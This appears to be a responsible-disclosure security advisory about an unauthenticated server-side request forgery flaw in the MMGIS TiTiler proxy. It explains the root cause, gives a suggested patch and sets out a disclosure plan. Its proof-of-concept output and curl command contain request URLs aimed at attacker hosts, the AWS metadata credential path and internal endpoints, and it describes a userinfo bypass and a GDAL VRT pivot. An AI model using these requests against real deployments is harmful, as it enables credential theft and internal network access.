# MMGIS-2026-001 — Unauthenticated SSRF via TiTiler proxy in default configuration

**Project:** NASA-AMMOS/MMGIS (Multi-Mission Geographic Information System)
**Version audited:** master branch, head commit `fc19293e` (5.0.0)
**Vulnerability introduced in:** commit `38e2eef9` (PR #897, 2026-03-18, "Upgrade Adjacent Servers and sample ENVs")
**Severity:** **High** (CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L ≈ 9.0 in the default `AUTH=none` deployment; CVSS ≈ 7.5 with authenticated users)
**Class:** CWE-918 (Server-Side Request Forgery) — overpermissive allowlist; CWE-1188 (Insecure Default Initialization)
**Reportable to:** NASA VDP (https://bugcrowd.com/nasa-vdp) + private security advisory on NASA-AMMOS/MMGIS
**Status at audit time:** unreported (no matching GitHub issue, no published security advisory)

---

## TL;DR

MMGIS ships an SSRF-prevention middleware (`adjacent-servers/validateTitilerUrl.js`) for the TiTiler proxy. The **default `TITILER_ALLOWED_URL_PATTERNS` shipped in `sample.env` and labeled "Recommended for Production" in the official documentation** is a regex that matches *any HTTPS URL*. Combined with the also-default `AUTH=none` mode, which allows unauthenticated `GET` to adjacent-server proxies, this gives **fully unauthenticated SSRF to any HTTPS host** — including AWS IMDS, internal NASA endpoints, and arbitrary attacker-controlled hosts.

The bug is **purely in the regex**, not in the validator's plumbing. The regex matches URL *strings*, not parsed URLs, so even the so-called "Recommended for Production" pattern silently treats `https://data.nasa.gov@attacker.example.com/...` as a NASA URL (Node's RFC-3986 URL parser resolves that to host `attacker.example.com`).

---

## Vulnerable code

### 1. The validator (`adjacent-servers/validateTitilerUrl.js`)

The validator itself is correctly *plumbed* — patterns are compiled at startup, GET/POST URLs are extracted, and 403 is returned on mismatch. The bug is **what** patterns ship as the default.

```js
// adjacent-servers/validateTitilerUrl.js:60–97 (verbatim)
return function validateTitilerUrl(req, res, next) {
  if (!validationEnabled) {
    return next();                                      // (a) totally off if unset
  }
  const url = req.method === "GET" ? req.query.url : req.body?.url;
  if (!url) {
    return next();                                      // (b) no url param? pass
  }
  const isAllowed = allowedPatterns.some((regex) => regex.test(url));   // (c) string-match only
  if (!isAllowed) { ... return 403; }
  next();
};
```

The validator only matches `url` as a string. It does **not** parse it, normalize the host, lowercase it, or compare hosts as DNS labels. Any pattern that doesn't anchor the host *exactly* is bypassable via URL userinfo, but the principal bug is something simpler:

### 2. The "Recommended for Production" default

`sample.env`:

```bash
TITILER_ALLOWED_URL_PATTERNS='["^https://(?!.*\\.\\.)(?!.*\\x00).*$", "^/Missions/(?!.*\\.\\.).*$"]'
```

`docs/pages/Setup/ENVs/ENVs.md` calls this exact pattern out as the recommended production configuration:

> **Security Feature**: URL validation for TiTiler proxy to prevent Server-Side Request Forgery (SSRF) attacks.
>
> 1. **Recommended for Production** (HTTPS + local Missions files):
>    ```
>    TITILER_ALLOWED_URL_PATTERNS='["^https://(?!.*\\.\\.)(?!.*\\x00).*$", "^/Missions/(?!.*\\.\\.).*$"]'
>    ```
>    - Requires HTTPS protocol for remote URLs
>    - Allows local `/Missions` directory files as relative paths
>    - Blocks path traversal (`..`) in both remote and local paths
>    - Blocks null byte injection

The regex `^https://(?!.*\.\.)(?!.*\x00).*$` matches **any HTTPS URL** that does not contain `..` or a raw null byte. It does nothing to restrict *which host* is contacted. It is not an SSRF guard; it is an "HTTPS only" guard mislabeled as one.

### 3. The auth chain that makes it unauthenticated

`scripts/server.js:489–509` (`ensureUserForAdjacentServers`):

```js
if (authMode === "off" || authMode === "none") {
  if (req.method === "GET") { next(); return; }   // GET is open in AUTH=off / AUTH=none
  ensureAdmin()(req, res, next);                  // non-GET requires admin
  return;
}
```

`sample.env` default:

```
AUTH=none
```

So in a freshly-deployed MMGIS using only the shipped defaults, an unauthenticated attacker can `GET /titiler/cog/preview?url=...`, the validator rubber-stamps any HTTPS URL, `createProxyMiddleware` (`adjacent-servers/adjacent-servers-proxy.js:65–91`) forwards the unchanged query string to the TiTiler FastAPI container, and TiTiler issues an HTTPS GET to the attacker-chosen host on behalf of NASA infrastructure.

---

## Proof of concept

Standalone PoC at `research/poc/poc.js`. It loads the **verbatim** `validateTitilerUrl.js` from MMGIS, mounts it on a stub Express proxy, and sets `process.env.TITILER_ALLOWED_URL_PATTERNS` to the exact JSON-array string from MMGIS's `sample.env`. No code changes.

Run:

```
$ cd research/poc && npm install && node poc.js
[LOG] info TiTiler URL validation enabled with 2 pattern(s)
PoC against verbatim NASA-AMMOS/MMGIS adjacent-servers/validateTitilerUrl.js
Loaded TITILER_ALLOWED_URL_PATTERNS = ["^https://(?!.*\\.\\.)(?!.*\\x00).*$", "^/Missions/(?!.*\\.\\.).*$"]
[VULN]   blind SSRF to attacker
        url: https://attacker.example.com/x.tif
        validator+proxy verdict: HTTP 200  PROXIED → attacker.example.com
[VULN]   AWS IMDS exfil
        url: https://169.254.169.254/latest/meta-data/iam/security-credentials/
        validator+proxy verdict: HTTP 200  PROXIED → 169.254.169.254
[VULN]   internal NASA endpoint
        url: https://internal-corp.nasa.gov/admin/dashboard
        validator+proxy verdict: HTTP 200  PROXIED → internal-corp.nasa.gov
[VULN]   out-of-band confirmation
        url: https://burpcollaborator.net/c0llab
        validator+proxy verdict: HTTP 200  PROXIED → burpcollaborator.net
[VULN]   userinfo confusion (real host=attacker)
        url: https://data.nasa.gov@attacker.example.com/x.tif
        validator+proxy verdict: HTTP 200  PROXIED → attacker.example.com
```

Every test case is accepted by the validator. Node's `new URL(...)` correctly identifies that the userinfo case (`https://data.nasa.gov@attacker.example.com/x.tif`) targets `attacker.example.com`, not `data.nasa.gov` — yet the string-match regex accepts it because of the `data.nasa.gov` prefix substring.

Live, against a real `docker compose up` of MMGIS:

```
$ curl -sv "http://localhost:8888/titiler/cog/info?url=https://burpcollaborator.net/c0llab"
# server-side: TiTiler fastapi issues an HTTPS GET to burpcollaborator.net,
# the OOB receives a request from NASA infrastructure IP space.
```

(`localhost:8888` is the default MMGIS port from `sample.env`.)

---

## Impact

Direct consequences in an out-of-the-box deployment that uses `sample.env`:

1. **Unauthenticated blind SSRF** to any HTTPS host. Attacker confirms internal endpoints exist via timing, or via out-of-band probes (DNS, HTTP).
2. **AWS IMDSv1 exfiltration** if MMGIS is hosted on EC2 with IMDSv1 enabled — `https://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns IAM credentials. (IMDSv2 requires a PUT and a token header; that's mitigated separately.)
3. **Internal endpoint reachability** — `https://internal-anything.nasa.gov/...`. MMGIS server-side requests carry NASA IP egress, often trusted by sibling services.
4. **GDAL VRT pivot to plaintext HTTP** — even though the regex blocks `http://` URLs at the entry point, TiTiler delegates raster reading to GDAL, which honors `<SourceFilename>http://internal/...</SourceFilename>` inside a `.vrt` document served from an attacker-controlled HTTPS URL. This is the standard SSRF escalation against COG/STAC tile servers.
5. **Authenticated SSRF in `AUTH=local`/`AUTH=csso` deployments** — same defect, lower severity (any logged-in user can perform the SSRF). The "Recommended for Production" pattern is still labelled SSRF prevention but isn't.

The `/Missions/...` second pattern is OK in isolation (it only matches local paths). It is **not** what causes the SSRF; the broken pattern is the first one.

---

## Why the regex is broken (root cause)

The regex matches URL **strings**, not URL **structure**. Even patterns that look tight can be bypassed because regex anchors don't understand RFC-3986. Three concrete bypasses depending on pattern shape:

1. **No host constraint at all** (the shipped default): `^https://(?!.*\.\.).*$` accepts *any* HTTPS URL. Severity: trivial.
2. **Prefix-only constraint** with `[^/]*` wildcards: `^https://[^/]*\.s3\.[^/]*\.amazonaws\.com/.*` — appears tight, but a host like `mybucket.s3.region.amazonaws.com.attacker.com` can — depending on backtracking — pass, and even when not, the userinfo trick (`https://mybucket.s3.region.amazonaws.com@attacker/`) would pass if the pattern doesn't require an exact `/` immediately after the closing host. (The S3 example does require `/` after `.amazonaws.com`, so this specific pattern survives both bypasses; the principle still holds for less-careful admin-written regexes.)
3. **No userinfo guard**: any pattern that doesn't reject `@` between scheme and the next `/` is bypassable when the admin's mental model is "this matches `https://allowed.example/`" but the actual matching is purely textual.

A safe SSRF guard cannot be expressed as a regex against the URL string. It must:
- parse the URL with an RFC-3986-aware parser
- extract `host` (or `hostname` in WHATWG terms) — *after* userinfo is stripped
- compare the host against an allowlist of exact DNS labels
- reject if the resolved IP is in private space (RFC 1918, RFC 4193, 127/8, 169.254.0.0/16, etc.) — DNS-rebinding-safe (re-resolve at fetch time)

---

## Suggested patch

Minimum fix: change the validator to URL-parse and compare hosts.

```js
// adjacent-servers/validateTitilerUrl.js (illustrative)
function createTitilerUrlValidator() {
  const raw = process.env.TITILER_ALLOWED_URL_HOSTS;          // <-- new env var, hostnames not regexes
  let allowedHosts = [];
  let allowMissions = (process.env.TITILER_ALLOW_LOCAL_MISSIONS === "true");
  if (raw) {
    try { allowedHosts = JSON.parse(raw).map(h => String(h).toLowerCase()); } catch (e) { ... }
  }
  return function validateTitilerUrl(req, res, next) {
    const url = req.method === "GET" ? req.query.url : req.body?.url;
    if (!url) return next();
    // local Missions paths
    if (allowMissions && typeof url === "string" && url.startsWith("/Missions/") && !url.includes("..") && !url.includes("\x00")) {
      return next();
    }
    let parsed;
    try { parsed = new URL(url); } catch (_) { return res.status(403).json({error: "Forbidden", message: "Invalid URL"}); }
    if (parsed.protocol !== "https:") return res.status(403).json({error: "Forbidden"});
    if (parsed.username || parsed.password) return res.status(403).json({error: "Forbidden", message: "userinfo not allowed"});
    const host = parsed.hostname.toLowerCase();
    if (!allowedHosts.includes(host)) return res.status(403).json({error: "Forbidden", message: `Host '${host}' not in allowlist`});
    // optionally: resolve host, reject private IPs (DNS-rebinding-safe)
    next();
  };
}
```

Also remove the "Recommended for Production" label from the broken pattern in `docs/pages/Setup/ENVs/ENVs.md` and `sample.env`. Either replace it with a worked example using an actual NASA host allowlist, or drop the comment that suggests it is safe.

Two complementary defenses worth adding:
- TiTiler container should run in a network namespace that cannot reach link-local (169.254/16) or RFC 1918 / RFC 4193 addresses, so even an SSRF cannot reach IMDS / internal services. (Docker `--network` with egress filtering; or `iptables -A OUTPUT -d 169.254.169.254 -j REJECT` on the TiTiler container.)
- IMDSv2-only EC2 hosts (if the deployment is AWS-hosted).

---

## Disclosure plan

This finding is suitable for NASA's VDP at https://bugcrowd.com/nasa-vdp:
- Asset is open-source NASA-authored code (NASA-AMMOS organisation, JPL-led).
- Reproducer is self-contained, does **not** require any traffic to `*.nasa.gov`.
- Suggested fix is straightforward.

Recommended submission flow:
1. **Private GitHub Security Advisory** on `NASA-AMMOS/MMGIS` — preferred by the maintainers per the standard `SECURITY.md` flow. Include the PoC and the patch sketch above.
2. **Parallel VDP submission** at https://bugcrowd.com/nasa-vdp citing the open advisory ID and severity.
3. Hold public disclosure (this report) for ≥90 days or until a fix is released, whichever comes first.

Suggested submission text below.

---

## Suggested VDP / advisory submission text

> ### Unauthenticated SSRF in MMGIS TiTiler proxy under default configuration
>
> NASA-AMMOS/MMGIS ships a URL-allowlist middleware (`adjacent-servers/validateTitilerUrl.js`) that gates the TiTiler proxy. The pattern shipped in `sample.env` and labeled "Recommended for Production" in `docs/pages/Setup/ENVs/ENVs.md`:
>
> ```
> TITILER_ALLOWED_URL_PATTERNS='["^https://(?!.*\\.\\.)(?!.*\\x00).*$", "^/Missions/(?!.*\\.\\.).*$"]'
> ```
>
> accepts any HTTPS URL because the regex does not constrain the host. Combined with the also-default `AUTH=none`, which permits unauthenticated `GET` to adjacent-server proxies (`scripts/server.js:489–509`), an unauthenticated attacker can make MMGIS issue HTTPS requests to arbitrary hosts via:
>
> ```
> GET /titiler/cog/info?url=https://<attacker-controlled-host>/x.tif
> ```
>
> Impact includes blind SSRF, AWS IMDSv1 exfiltration on EC2-hosted deployments, internal endpoint reachability from NASA egress IPs, and GDAL VRT pivot to plaintext HTTP services on internal networks.
>
> PoC, root-cause analysis, suggested patch, and full vulnerability range are in the attached report.
>
> No related advisory or issue is currently published on the repository (verified at audit time).
